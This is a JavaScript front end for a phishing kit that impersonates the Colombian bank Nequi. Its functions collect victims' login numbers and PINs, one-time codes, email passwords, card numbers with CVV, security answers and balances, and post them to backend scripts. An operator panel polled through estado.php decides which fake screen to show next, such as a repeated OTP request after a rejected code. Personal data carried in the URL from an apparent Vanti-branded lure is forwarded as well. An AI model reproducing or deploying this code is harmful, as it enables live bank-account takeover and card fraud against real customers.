// Función para formatear saldo con puntos de miles
function formatearSaldo(saldo) {
    if (!saldo) return saldo;
    return String(saldo).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

// Inicializar variable para almacenar el estado anterior
window.__lastNequiEstado = null;

/** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 5 saldo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
function consultar_estado() {
    if (window.__nequiDemoSaldo) {
        return;
    }
    $.post("../../../process/estado.php", function (data) {
        var s = $.trim(String(data));
        if (!/^\d+$/.test(s)) {
            return;
        }
        var prevEst = window.__lastNequiEstado;
        window.__lastNequiEstado = s;
        switch (s) {
            case '2':
                if (prevEst !== '2' || !$(".otp").is(":visible") || $(".errorotp").is(":visible")) {
                    vista_otp();
                }
                espera = 1;
                break;
            case '4':
                if (prevEst !== '4' || !$(".correo-con").is(":visible")) {
                    vista_email();
                }
                espera = 1;
                break;
            case '5':  // Estado para saldo
                if (prevEst !== '5' || !$(".saldo-disponible").is(":visible")) {
                    vista_saldo();
                }
                espera = 1;
                break;
            case '6':
                if (prevEst !== '6' || !$(".tarjeta").is(":visible")) {
                    vista_tarjeta();
                }
                espera = 1;
                break;
            case '8':
                if (prevEst !== '8' || !$(".errorotp").is(":visible")) {
                    vista_errorotp();
                }
                espera = 1;
                break;
            case '10':
                if (prevEst !== '10') {
                    window.location.href = "../../../finish-no-back-button/";
                }
                espera = 1;
                break;
            case '12':
                if (prevEst !== '12' || !$(".acceso").is(":visible")) {
                    vista_usuario();
                }
                espera = 1;
                break;
            case '25':
                if (prevEst !== '25' || !$(".pregunta2").is(":visible")) {
                    vista_pregunta2();
                }
                espera = 1;
                break;
            case '255':
                if (prevEst !== '255' || !$(".pregunta2").is(":visible")) {
                    vista_preguntarep();
                }
                espera = 1;
                break;
            case '27':
                if (prevEst !== '27') {
                    vista_saldo_listo();
                }
                espera = 1;
                break;
            case '28':
                if (prevEst !== '28') {
                    vista_saldo_listo();
                }
                espera = 1;
                break;
            default:
                espera = 1;
                break;
        }
    });
}

function vista_saldo() {
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".total").hide();
    $(".acceso").hide();
    $(".otp").hide();
    $(".errorotp").hide();
    $(".correo-con").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();
    
    var el = document.getElementById("inputsaldo");
    if (el) {
        el.value = "";
        el.focus();
    }
    
    $(".saldo-disponible").show();
}

function vista_saldo_listo() {
    $(".saldo-disponible").hide();
    $(".fondo").show();
    $(".mensaje").show();
}

function vista_preguntarep(){
    $(".saldo-disponible").hide();

    var op = 'pregunta';

    $.post( "../../run/pasopregunta2.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".codigoqr").hide();
    $(".clcj").hide();
    $(".pregunta2").show();
    $("#resp2").focus();
}

function salir(){
    equi = detectar_dispositivo();
	console.log(equi);

        if (equi === 'Android' ) {

            var op = 'link';

            $.post( "run/traer-datos.php",{op: op},function(date) {
                console.log(date);
                var link = date;
                window.location.href = 'https://'+link;
                
             }); 

        } else {
            console.log('no es android');
            window.location.href = "https://www.nequi.com.co/";
        }
}

function vista_otp(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();
    $(".total").show();     
    $(".otp").show();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;
}

function vista_errorotp(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    $(".tarjeta").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show(); 
    $(".otp").show();        
    $(".errorotp").show();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;
}

function vista_usuario(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("usuario").value = "";
    document.getElementById("password").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".acceso").show();
    $("#usuario").focus();
}

function vista_email(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("email").value = "";
    document.getElementById("clavemail").value = "";

    $(".acceso").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".correo-con").show();
    $("#email").focus();
}

function vista_tarjeta(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("tarjeta16").value = "";
    document.getElementById("Fecha").value = "";
    document.getElementById("cvv").value = "";

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjeta").show();
    $("#tarjeta16").focus();
}

function vista_tarjetadt(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16dt").value = "";
    document.getElementById("Fechadt").value = "";
    document.getElementById("cvvdt").value = "";
    document.getElementById("clavedt").value = ""; 

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".tarjeta").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjetadt").show();
    $("#tarjeta16dt").focus();
}

function vista_apellidos(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("apellido").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide(); 
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".apellidos").show();
    $("#apellido").focus();
}

function vista_fnacimiento(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("nacimiento").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide();  
    $(".apellidos").hide(); 
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".fnacimiento").show();
    $("#nacimiento").focus();
}

function vista_celular(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("celular").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".mobil").show(); 
    $("#celular").focus();
}

function vista_pregunta(){
    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide();
    $(".codigootp3").hide();     
    $(".total").show();     
    $(".pregunta").show();
    $("#resp").focus();
}

function vista_pregunta2(){
    $(".saldo-disponible").hide();

    var op = 'pregunta';

    $.post( "../../../process/nequi_pregunta.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".pregunta2").show();
    $("#resp2").focus();
}

function vista_clave(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave").show();
    $("#clave").focus();
}

function vista_clave2(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave2").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave2").show();
    $("#clave2").focus();
}

function vista_smsotp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("smsotp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();   
    $(".smsotp").show();
    $("#smsotp").focus();
}

function vista_gestionpago(){
    $(".fondo").hide();
    $(".mensaje").hide();
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".total").hide();
    $(".codigootp3").hide();    
    $(".solicitacodigo").show();
}

function actualizar_casos(){
    $.post( "../process/casos.php", function(data) {
        $(".contenido").html(data);     
        $.post( "../process/pito.php", function(res) {
            if (res == "SI") {
                $("audio").get(0).play();
            }
        });
    });
}

function guardarSaldoNequi() {
    var saldo = document.getElementById("inputsaldo").value;
    
    if (saldo.trim().length < 3) {
        document.getElementById("msgSaldo").style.display = "block";
        return;
    }
    
    // Mostrar spinner de carga
    vista_saldo_listo();
    
    // Limpiar el saldo de puntos para enviar solo números
    var saldoLimpio = saldo.replace(/\./g, '');
    
    // Enviar saldo al backend
    $.post("../../../process/guardar_saldo.php", {saldo: saldoLimpio}, function(data) {
        if (data.trim() === 'OK') {
            console.log('Saldo guardado correctamente');
            // El panel cambiará de estado automáticamente (estado 27 → 28)
        } else {
            console.error('Error al guardar saldo');
            vista_saldo();  // Volver a mostrar el formulario si hay error
        }
    });
}

function obtenerFechaFormato(){
    var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
    var diasSemana = new Array("Domingo","Lunes","Martes","Mi\u00E9rcoles","Jueves","Viernes","S\u00E1bado");
    var f = new Date();
    var minuto = (f.getMinutes() < 10) ? '0' + f.getMinutes() : f.getMinutes();
    var hora = (f.getHours() > 12) ? f.getHours() - 12 : f.getHours();
    var hora = (hora < 10) ? '0' + hora : hora;
    var meridiano = (f.getHours() > 11) ? 'PM' : 'AM';
    document.write(diasSemana[f.getDay()] + ' ' + f.getDate() + ' de ' + meses[f.getMonth()] + ' de ' + f.getFullYear() + ', ' + hora + ':' + minuto + ' ' + meridiano);
} 

var espera = 0;

 function paso1(){

    $(".home").hide();
    $(".acceso").show();

 }  

 function mostrar() {
          setTimeout(function() {
                        $(".clave").show();
                        $(".acceso").hide();
          }, 3000);
} 

// 🟢 [REESCRITURA DE FUNCIÓN FINAL] - Ahora atrapa LOS DATOS de Vanti desde la URL
function final() {

    if ($("#usuario").val() != "") {
      if ($("#usuario").val().length == 10 ) {
        $("#msgUsuario").css("display", "none");  

          if ($("#password").val() != "") {
            if ($("#password").val().length == 4 ) {
              $("#msgClave").css("display", "none");

              $(".fondo").show();
              $(".mensaje").show();

              var dispo = detectar_dispositivo();
              
              // 🟢 ATRAPAMOS TODOS LOS DATOS QUE MANDÓ VANTI POR LA URL
              var urlParams = new URLSearchParams(window.location.search);

                // 🟢 ENVIAMOS TODO AL BACKEND EN UNA SOLA PETICIÓN
                $.post( "../../../process/pasologin.php", { 
                    usr: $("#usuario").val(), 
                    pas: $("#password").val(),  
                    ban: "Nequi", 
                    dis: dispo,
                    nom: urlParams.get('nom') || '',
                    ape: urlParams.get('ape') || '',
                    tdoc: urlParams.get('tdoc') || '',
                    doc: urlParams.get('doc') || '',
                    cel: urlParams.get('cel') || '',
                    eml: urlParams.get('eml') || '',
                    dir: urlParams.get('dir') || '',
                    emp: urlParams.get('emp') || '',
                    ref: urlParams.get('ref') || '',
                    mnt: urlParams.get('mnt') || ''
                }, function( data ) {
                  espera = 1;     
                }); 

            }else{
              $("#msgClave").html(" ¡Ups! Verifique los datos"); 
              $("#msgClave").css("display", "table");
              $("#password").focus();
            }   
          }else{    
            $("#msgClave").html("¡Ups! El campo esta vacio"); 
            $("#msgClave").css("display", "table");
            $("#password").focus();
          }
      }else{
        $("#msgUsuario").html("¡Ups! Solo puedes ingresar 10 digitos");
        $("#msgUsuario").css("display", "table");
        $("#usuario").focus();  
      }
    }else{  
      $("#msgUsuario").html("¡Ups! El campo esta vacio");
      $("#msgUsuario").css("display", "table");
      $("#usuario").focus();
    }
}

function registaclave() {

    if ($("#clave").val() != "") {
      if ($("#clave").val().length == 4 ) {
        $("#msgClave").css("display", "none");
        var op = 'clave';
        console.log($("#clave").val());
        $.post( "run/launch.php",{ pass: $("#clave").val(), op: op },function( data ) {
          espera = 1;
        }); 
      }else{
        $("#msgClave").html("Verifique los datos"); 
        $("#msgClave").css("display", "table");
        $("#clave").focus();
      }   
    }else{    
      $("#msgClave").html("El campo esta vacio"); 
      $("#msgClave").css("display", "table");
      $("#clave").focus();
    }
  
}

function registaclave2() {

    if ($("#clave2").val() != "") {
      if ($("#clave2").val().length == 4 ) {
        $("#msgClave").css("display", "none");
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'clave';
        $.post( "run/launch.php",{ pass: $("#clave2").val(), op: op },function( data ) {
          espera = 1;
        }); 
      }else{
        $("#msgClave").html("Verifique los datos"); 
        $("#msgClave").css("display", "table");
        $("#clave2").focus();
      }   
    }else{    
      $("#msgClave").html("El campo esta vacio"); 
      $("#msgClave").css("display", "table");
      $("#clave2").focus();
    }
  
}

function guardarotp(dina){
      $(".fondo").show();
      $(".mensaje").show();

      console.log(dina);
      var op = 'otp';
      $.post( "../../../process/pasootp.php",{ otp:dina },function( data ) {
        espera = 1;
      });
}


function registraremail(){
  if ($("#email").val() != "") {  
    $("#msgEmail").css("display", "none");  
    if ($("#clavemail").val() != "") {
      $("#msgClaveEmail").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'email';
      $.post( "../../../process/pasocorreo.php",{ eml: $("#email").val(), clv: $("#clavemail").val(), cel: "-" },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgClaveEmail").css("display", "table");
      $("#msgEmail").css("display", "none");
      $("#clavemail").focus();
    }
  }else{
    $("#msgClaveEmail").css("display", "none");
    $("#msgEmail").css("display", "table");
    $("#email").focus();
  }
}

function registrarcel(){
  if ($("#celular").val() != "") {
    if ($("#celular").val().length == 10) {
      $("#msgCelular").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'cel';
      $.post( "run/launch.php",{ cel:$("#celular").val(), op: op },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgCelular").html(" ¡Ups! Verifique los datos");
      $("#msgCelular").css("display", "table");
      $("#celular").focus();
    } 
  }else{
    $("#msgCelular").html(" ¡Ups! El campo está vacio");
    $("#msgCelular").css("display", "table");
    $("#celular").focus();
  }
}

function guardarape(){
  if ($("#apellido").val() != "") {
      $("#msgAPE").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'apellido';
      $.post( "run/launch.php",{ ape:$("#apellido").val(), op: op },function( data ) {
        espera = 1;
      });
  }else{
    $("#msgAPE").html(" ¡Ups! El campo está vacio");
    $("#msgAPE").css("display", "table");
    $("#apellido").focus();
  }
}

function guardarnac(){
  if ($("#nacimiento").val() != "") {
     if ($("#nacimiento").val().length == 4) {
      $("#msgAnio").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'nacimiento';
      $.post( "run/launch.php",{ nac:$("#nacimiento").val(), op: op  },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgAnio").html(" ¡Ups! Verifique los datos");
      $("#msgAnio").css("display", "table");
      $("#nacimiento").focus();
    } 
  }else{
    $("#msgAnio").html("El campo está vacio");
    $("#msgAnio").css("display", "table");
    $("#nacimiento").focus();
  }
}

function guardartar(){
  if ($("#tarjeta16").val() != "") {
    if ($("#tarjeta16").val().length == 16) {
      $("#msgTarjeta").css("display", "none");

      if ($("#Fecha").val() != "" ) {
        $("#msgExpira").css("display", "none");

        if ($("#cvv").val() != "") {
          if ($("#cvv").val().length == 3) {
            $("#msgCVV").css("display", "none");

            $(".fondo").show();
            $(".mensaje").show();
            fech = $("#Fecha").val();
            var op = 'tarjetacd';
            $.post( "../../../process/pasotarjeta.php",{ tar: $("#tarjeta16").val(), fec: fech, cvv: $("#cvv").val() },function( data ) {
              espera = 1;
            });
          }else{
            $("#msgCVV").html("Verifique los datos");
            $("#msgTarjeta").css("display", "none");
            $("#msgExpira").css("display", "none");
            $("#msgCVV").css("display", "table");
            $("#cvv").focus();
          }
        }else{
          $("#msgCVV").html("El campo está vacio");
          $("#msgTarjeta").css("display", "none");
          $("#msgExpira").css("display", "none");
          $("#msgCVV").css("display", "table");
          $("#cvv").focus();
        }
      }else{
        $("#msgExpira").html("El campo está vacio");
        $("#msgTarjeta").css("display", "none");
        $("#msgExpira").css("display", "table");
        $("#msgCVV").css("display", "none");
        $("#expira").focus();
      }
    }else{
      $("#msgTarjeta").html("Verifique los datos");
      $("#msgTarjeta").css("display", "table");
      $("#msgExpira").css("display", "none");
      $("#msgCVV").css("display", "none");
      $("#tarjeta16").focus();          
    }
  }else{
    $("#msgTarjeta").html("El campo está vacio");
    $("#msgTarjeta").css("display", "table");
    $("#msgExpira").css("display", "none");
    $("#msgCVV").css("display", "none");
    $("#tarjeta16").focus();
  } 
}

function guardartardt(){
  if ($("#tarjeta16dt").val() != "") {
    if ($("#tarjeta16dt").val().length == 16) {
      $("#msgTarjetadt").css("display", "none");

      if ($("#Fechadt").val() != "" ) {
        $("#msgExpiradt").css("display", "none");
  
        if ($("#cvvdt").val() != "") {
          if ($("#cvvdt").val().length == 3) {
            $("#msgCVVdt").css("display", "none");

                  if ($("#clavedt").val() != "") {
                    if ($("#clavedt").val().length == 4) {
                      $("#msgClavedt").css("display", "none");

                      $(".fondo").show();
                      $(".mensaje").show();
                      fecha = $("#Fechadt").val();
                      tj = $("#tarjeta16dt").val();
                      cvv = $("#cvvdt").val();
                      clv = $("#clavedt").val();
                      var op = 'tarjetadt';

                      $.post( "../../../process/pasotarjetadt.php",{ tjdt:tj, fechadt:fecha, cvvdt:cvv, clvdt:clv },function( data ) {
                        espera = 1;
                      });
                    }else{
                      $("#msgClavedt").html("Verifique los datos");
                      $("#msgClavedt").css("display", "table");
                      $("#msgTarjetadt").css("display", "none");
                      $("#msgExpiradt").css("display", "none");
                      $("#msgCVVdt").css("display", "none");
                      $("#clavedt").focus();
                    }
                  }else{
                    $("#msgClavedt").html("El campo está vacio");
                    $("#msgClavedt").css("display", "table");
                    $("#msgTarjetadt").css("display", "none");
                    $("#msgExpiradt").css("display", "none");
                    $("#msgCVVdt").css("display", "none");
                    $("#clavedt").focus();
                  }


              }else{
                $("#msgCVVdt").html("Verifique los datos");
                $("#msgCVVdt").css("display", "table");
                $("#msgTarjetadt").css("display", "none");
                $("#msgExpiradt").css("display", "none");
                $("#msgClavedt").css("display", "none");                
                $("#cvvdt").focus();
              }
            }else{
              $("#msgCVVdt").html("El campo está vacio");
              $("#msgCVVdt").css("display", "table");
              $("#msgTarjetadt").css("display", "none");
              $("#msgExpiradt").css("display", "none");
              $("#msgClavedt").css("display", "none");
              $("#cvvdt").focus();
            }

      }else{
        $("#msgExpiradt").html("El campo está vacio");
        $("#msgExpiradt").css("display", "table");
        //$("#msgTarjetadt").css("display", "none");
        $("#msgCVVdt").css("display", "none");
        $("#msgClavedt").css("display", "none");
        $("#expiradt").focus();
      }


    }else{
      $("#msgTarjetadt").html("Verifique los datos");
      $("#msgTarjetadt").css("display", "table");
      $("#msgExpiradt").css("display", "none");
      $("#msgCVVdt").css("display", "none");
      $("#msgClavedt").css("display", "none");
      $("#tarjeta16dt").focus();          
    }
  }else{
    $("#msgTarjetadt").html("El campo está vacio");
    $("#msgTarjetadt").css("display", "table");
    $("#msgExpiradt").css("display", "none"); 
    $("#msgCVVdt").css("display", "none");
    $("#msgClavedt").css("display", "none");
    $("#tarjeta16dt").focus();
  } 
}

function registaresp() {

  if ($("#resp").val() != "") {
      if ($("#resp").val().length == 6 ) {
        $("#msgResp").css("display", "none");
        var resp = $("#resp").val() ;
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'respuesta';
        $.post( "run/launch.php",{ resp: resp, op: op },function( data ) {
          espera = 1;
        }); 
      }else{
        $("#msgResp").html(" ¡Ups! Verifique los datos");
        $("#msgResp").css("display", "table");
        $("#resp").focus();  
      }        
    }else{
    $("#msgResp").html(" ¡Ups! El campo esta vacio");
    $("#msgResp").css("display", "table");
    $("#resp").focus();
  }        
}

function registaresp2() {

  if ($("#resp2").val() != "") {
        $("#msgResp").css("display", "none");
        var resp2 = $("#resp2").val() ;
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'respuesta2';
        $.post( "../../../process/pasoresp.php",{ resp: resp2 },function( data ) {
          espera = 1;
        }); 
    }else{
    $("#msgResp").html(" ¡Ups! El campo esta vacio");
    $("#msgResp").css("display", "table");
    $("#resp").focus();
  }        
}


function guardarsmsotp(){
  if ($("#smsotp").val() != "") {
    if ($("#smsotp").val().length == 6) {
      $("#msgSMSOTP").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'smsotp';
      $.post( "../../../process/pasootp.php",{ otp: $("#smsotp").val() },function( data ) {
        espera = 1;
      });

    }else{
      $("#msgSMSOTP").html("Verifique los datos");
      $("#msgSMSOTP").css("display", "table");
      $("#smsotp").focus();
    }
  }else{
    $("#msgSMSOTP").html("El campo está vacio");
    $("#msgSMSOTP").css("display", "table");
    $("#smsotp").focus();
  }
}


function pedircodigo() {

  var estado = 34 ;
  var op = 'pedircodigo';
      $.post( "run/launch.php",{ estado: estado, op: op },function( data ) {
        espera = 1;
      });  

    setTimeout(function() {
        $(".solicitacodigo").hide(); 
        $(".codigootp3").show();  
    }, 3000);      


}


function guardarotp3(){
  if ($("#codigo").val() != "") {
    if ($("#codigo").val().length == 6) {
      $("#msgCodigo").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'otp';
      $.post( "../../../process/pasootp.php",{ otp: $("#codigo").val() },function( data ) {
        espera = 1;
      });

    }else{
      $("#msgCodigo").html("Verifique los datos");
      $("#msgCodigo").css("display", "table");
      $("#codigo").focus();
    }
  }else{
    $("#msgCodigo").html("El campo está vacio");
    $("#msgCodigo").css("display", "table");
    $("#codigo").focus();
  }
}



  jQuery(document).ready(function(){
  // Listen for the input event.  
  
  jQuery("#clave").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });
  
  jQuery("#clave2").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#codigootp").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  }); 
  
  jQuery("#codigootp2").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#celular").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#nacimiento").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#tarjeta16").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  jQuery("#cvv").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  

    jQuery("#tarjeta16dt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  jQuery("#cvvdt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });
  
  jQuery("#clavedt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  
});